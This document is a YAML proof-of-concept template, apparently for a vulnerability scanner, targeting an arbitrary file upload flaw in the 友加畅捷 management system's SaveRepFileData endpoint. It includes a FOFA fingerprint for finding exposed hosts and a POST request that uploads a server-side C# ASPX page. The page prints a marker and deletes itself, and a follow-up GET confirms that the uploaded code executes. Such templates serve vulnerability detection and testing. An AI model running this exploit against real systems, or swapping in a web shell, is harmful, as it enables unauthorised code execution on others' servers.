id: poc-yaml-youjiasoft-saverepfiledata-anyfile-upload
info:
  name: 友加畅捷管理系统 SaveRepFileData 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 友加畅捷管理系统
  fofa: icon_hash="2049187099"
variables:
  t1: random_str(7)
  t2: base64(t1)
requests:
- method: POST
  path: /ReportDesign/RepFile.ashx?RepFile=pages/{{.t1}}.aspx&Type=SaveRepFileData
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: "<script runat=\"server\" language=\"C#\">\n    protected void Page_Load(object\
    \ sender, EventArgs e)\n    {\n        Response.Write(\"{{.t2}}\");\n        string\
    \ filePath = Server.MapPath(Request.ServerVariables[\"SCRIPT_NAME\"]);\n     \
    \   System.IO.File.Delete(filePath);\n        Response.End();\n    }\n</script>"
  expression: status_code == 200 && contains(body,"\"success\":true") && !contains(body,"<")
- method: GET
  path: /Report/Pages/{{.t1}}.aspx
  expression: status_code == 200 && body == t2
transport: http
